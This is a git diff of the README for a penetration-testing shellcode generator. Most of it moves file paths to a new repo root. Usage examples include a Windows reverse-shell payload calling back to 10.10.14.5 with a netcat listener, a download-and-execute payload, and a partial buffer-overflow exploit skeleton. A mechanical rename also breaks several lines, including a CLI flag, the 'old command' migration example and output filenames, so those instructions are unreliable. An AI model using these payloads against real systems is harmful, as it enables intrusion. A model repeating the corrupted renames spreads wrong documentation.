@@ -44,8 +44,8 @@ See [USE_WITHOUT_ACTIVATE.md](USE_WITHOUT_ACTIVATE.md) for more usage options.
 The tool has been refactored into a modular package structure:
 
 ```
-shellcode/
-├── shellgen/                    # Main package
+shellgen/
+├── src/                        # Core package modules
 │   ├── __init__.py             # Package initialization
 │   ├── encoders.py             # Bad character encoding
 │   ├── assembler.py            # Assembly and verification (Keystone)
@@ -60,10 +60,8 @@ shellcode/
 ├── shellgen.sh                 # Wrapper script (no venv activation needed!)
 ├── hashgen.sh                  # Hash generator wrapper (no venv activation needed!)
 ├── common_apis.txt             # Common Windows API function names
-├── requirements.txt            # Python dependencies
 ├── README.md                   # This file
-├── CLAUDE.md                   # Technical documentation
-└── shellcode.py                # DEPRECATED - Legacy monolithic script
+└── CLAUDE.md                   # Technical documentation
 ```
 
 **Note:** The original `shellcode.py` is deprecated. Use `shellgen_cli.py` instead.
@@ -87,8 +85,8 @@ Using a dedicated virtual environment is the cleanest and recommended approach.
 sudo apt update
 sudo apt install -y python3 python3-venv python3-pip cmake build-essential
 
-# Navigate to the shellcode directory
-cd /path/to/pentest-scripts/shellcode
+# Navigate to the repo root
+cd /path/to/rop_tools
 
 # Create a dedicated virtual environment
 python3 -m venv venv
@@ -96,11 +94,11 @@ python3 -m venv venv
 # Activate the virtual environment
 source venv/bin/activate
 
-# Install dependencies in the virtual environment
+# Install dependencies from consolidated requirements.txt
 pip install -r requirements.txt
 
 # Verify installation
-./shellgen_cli.py --list-payloads
+cd shellgen && ./shellgen_cli.py --list-payloads
 ```
 
 #### Fedora/RHEL/CentOS
@@ -109,18 +107,18 @@ pip install -r requirements.txt
 # Install system dependencies
 sudo dnf install -y python3 python3-pip cmake gcc gcc-c++ make
 
-# Navigate to the shellcode directory
-cd /path/to/pentest-scripts/shellcode
+# Navigate to the repo root
+cd /path/to/rop_tools
 
 # Create and activate virtual environment
 python3 -m venv venv
 source venv/bin/activate
 
-# Install dependencies
+# Install dependencies from consolidated requirements.txt
 pip install -r requirements.txt
 
 # Verify installation
-./shellgen_cli.py --list-payloads
+cd shellgen && ./shellgen_cli.py --list-payloads
 ```
 
 #### Arch Linux
@@ -129,18 +127,18 @@ pip install -r requirements.txt
 # Install system dependencies
 sudo pacman -S python python-pip cmake base-devel
 
-# Navigate to the shellcode directory
-cd /path/to/pentest-scripts/shellcode
+# Navigate to the repo root
+cd /path/to/rop_tools
 
 # Create and activate virtual environment
 python3 -m venv venv
 source venv/bin/activate
 
-# Install dependencies
+# Install dependencies from consolidated requirements.txt
 pip install -r requirements.txt
 
 # Verify installation
-./shellgen_cli.py --list-payloads
+cd shellgen && ./shellgen_cli.py --list-payloads
 ```
 
 #### Alpine Linux
@@ -149,18 +147,18 @@ pip install -r requirements.txt
 # Install system dependencies
 apk add --no-cache python3 py3-pip cmake make gcc g++ musl-dev
 
-# Navigate to the shellcode directory
-cd /path/to/pentest-scripts/shellcode
+# Navigate to the repo root
+cd /path/to/rop_tools
 
 # Create and activate virtual environment
 python3 -m venv venv
 source venv/bin/activate
 
-# Install dependencies
+# Install dependencies from consolidated requirements.txt
 pip install -r requirements.txt
 
 # Verify installation
-./shellgen_cli.py --list-payloads
+cd shellgen && ./shellgen_cli.py --list-payloads
 ```
 
 ### Using the Virtual Environment
@@ -168,14 +166,14 @@ pip install -r requirements.txt
 Every time you want to use the shellcode generator, activate the virtual environment first:
 
 ```bash
-# Navigate to the shellcode directory
-cd /path/to/pentest-scripts/shellcode
+# Navigate to the repo root
+cd /path/to/rop_tools
 
 # Activate the virtual environment
 source venv/bin/activate
 
 # Now you can use the tool
-./shellgen_cli.py --platform linux --payload execve --cmd "whoami" --arch arm64
+cd shellgen && ./shellgen_cli.py --platform linux --payload execve --cmd "whoami" --arch arm64
 
 # When done, deactivate the virtual environment
 deactivate
@@ -188,11 +186,11 @@ deactivate
 Create a wrapper script that automatically activates the virtual environment:
 
 ```bash
-# Navigate to shellcode directory
-cd /path/to/pentest-scripts/shellcode
+# Navigate to shellgen directory
+cd /path/to/pentest-scripts/shellgen
 
 # Create wrapper script
-cat > shellcode-wrapper.sh << 'EOF'
+cat > shellgen-wrapper.sh << 'EOF'
 #!/bin/bash
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/venv/bin/activate"
@@ -201,7 +199,7 @@ deactivate
 EOF
 
 # Make it executable
-chmod +x shellcode-wrapper.sh
+chmod +x shellgen-wrapper.sh
 
 # Create symlink in ~/bin
 mkdir -p ~/bin
@@ -226,8 +224,8 @@ cat >> ~/.bashrc << 'EOF'
 
 # Shellcode generator function
 shellgen() {
-    SHELLCODE_DIR="/path/to/pentest-scripts/shellcode"
-    (cd "$SHELLCODE_DIR" && source venv/bin/activate && ./shellgen_cli.py "$@")
+    REPO_ROOT="/path/to/rop_tools"
+    (cd "$REPO_ROOT" && source venv/bin/activate && cd shellgen && ./shellgen_cli.py "$@")
 }
 EOF
 
@@ -238,7 +236,7 @@ source ~/.bashrc
 shellgen --list-payloads
 ```
 
-**Note:** Replace `/path/to/pentest-scripts/shellcode` with the actual path to your shellcode directory.
+**Note:** Replace `/path/to/rop_tools` with the actual path to your repo root directory.
 
 ## Available Payloads
 
@@ -320,7 +318,7 @@ shellgen --platform windows --payload download_exec \
 # Start listener on attacker machine
 nc -lvnp 443
 
-# Generate shellcode with default cmd.exe shell
+# Generate shellgen with default cmd.exe shell
 shellgen --platform windows --payload reverse_shell \
   --host 10.10.14.5 \
   --port 443 \
@@ -357,7 +355,7 @@ shellgen --platform windows --payload winexec \
   --cmd "calc.exe" \
   --arch x86 \
   --bad-chars 00,0a,0d,20 \
-  --debug-shellcode
+  --debug-shellgen
 
 # Output shows:
 # - Line number and offset for each instruction
@@ -399,7 +397,7 @@ shellgen --platform linux --payload execve \
 #### Assembly Format (default)
 ```bash
 shellgen --platform linux --payload execve --cmd "whoami" --arch arm64
-# Creates shellcode.asm
+# Creates shellgen.asm
 ```
 
 #### Python Bytes Format
@@ -436,7 +434,7 @@ For advanced use cases, you can create custom payloads by defining API calls in 
     {
       "api": "MessageBoxA",
       "dll": "user32.dll",
-      "args": [0, "Hello from custom shellcode!", "Custom Payload", 0]
+      "args": [0, "Hello from custom shellgen!", "Custom Payload", 0]
     }
   ],
   "exit": true
@@ -482,7 +480,7 @@ cat > my_payload.json << 'EOF'
 }
 EOF
 
-# Generate shellcode from JSON (uses bad_chars from JSON)
+# Generate shellgen from JSON (uses bad_chars from JSON)
 ./shellgen.sh --platform windows --json my_payload.json --arch x86
 
 # Override bad_chars from command line (adds 0x20 to bad characters)
@@ -499,7 +497,7 @@ The project includes a sample custom payload:
 # View the example
 cat example_payload.json
 
-# Generate shellcode from example
+# Generate shellgen from example
 ./shellgen.sh --platform windows --json example_payload.json --arch x86 --format python
 ```
 
@@ -729,9 +727,10 @@ Output formats automatically detect TTY vs file output:
 
 ### Dependencies
 
-Visual features require the Rich library (included in requirements.txt):
+Visual features require the Rich library (included in the consolidated requirements.txt at repo root):
 ```bash
-pip install rich
+# From repo root
+pip install -r requirements.txt
 ```
 
 If Rich is not available, the tool automatically falls back to plain text output.
@@ -744,10 +743,10 @@ If Rich is not available, the tool automatically falls back to plain text output
 #!/usr/bin/env python3
 import struct
 
-# Generate shellcode with:
+# Generate shellgen with:
 # shellgen --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64 --format python
 
-shellcode = b"\x42\x00\x80\xd2\x21\x00\x00\x8b..."  # Your generated shellcode
+shellcode = b"\x42\x00\x80\xd2\x21\x00\x00\x8b..."  # Your generated shellgen
 
 # Build exploit payload
 offset = 264  # Offset to return address
@@ -769,21 +768,21 @@ print(f"[+] Shellcode size: {len(shellcode)} bytes")
 ## Using as a Python Library
 
 ```python
-from shellgen.generators import WindowsGenerator, LinuxGenerator
-from shellgen.payloads import windows_messagebox, linux_execve
-from shellgen.assembler import assemble_to_binary
+from src.generators import WindowsGenerator, LinuxGenerator
+from src.payloads import windows_messagebox, linux_execve
+from src.assembler import assemble_to_binary
 
 # Example 1: Windows MessageBox (x86)
 config = windows_messagebox(
     title="Pwned",
-    message="Hello from shellcode!",
+    message="Hello from shellgen!",
     bad_chars={0x00, 0x0a, 0x0d}
 )
 
 generator = WindowsGenerator(config['bad_chars'], arch='x86')
 asm_code = generator.generate(config)
 shellcode = assemble_to_binary(asm_code, arch='x86')
-print(f"Windows x86 shellcode size: {len(shellcode)} bytes")
+print(f"Windows x86 shellgen size: {len(shellcode)} bytes")
 
 # Example 2: Linux ARM64 execve
 config = linux_execve(
@@ -795,7 +794,7 @@ config = linux_execve(
 generator = LinuxGenerator(config['bad_chars'], arch='arm64')
 asm_code = generator.generate(config)
 shellcode = assemble_to_binary(asm_code, arch='arm64')
-print(f"Linux ARM64 shellcode size: {len(shellcode)} bytes")
+print(f"Linux ARM64 shellgen size: {len(shellcode)} bytes")
 ```
 
 ## Migration from Old Script
@@ -804,7 +803,7 @@ The original `shellcode.py` monolithic script is deprecated. Here's the migratio
 
 ### Old Command
 ```bash
-python3 shellcode.py --payload winexec_cmd --cmd "calc.exe" --arch x86
+python3 shellgen.py --payload winexec_cmd --cmd "calc.exe" --arch x86
 ```
 
 ### New Command
@@ -1001,14 +1000,14 @@ See the installation troubleshooting section in the original README or install f
 
 ### Remove Virtual Environment
 ```bash
-cd /path/to/pentest-scripts/shellcode
+cd /path/to/rop_tools
 rm -rf venv
 ```
 
 ### Remove Wrapper Script/Symlink
 ```bash
 rm ~/bin/shellgen
-rm shellcode-wrapper.sh
+rm shellgen-wrapper.sh
 ```
 
 ## License
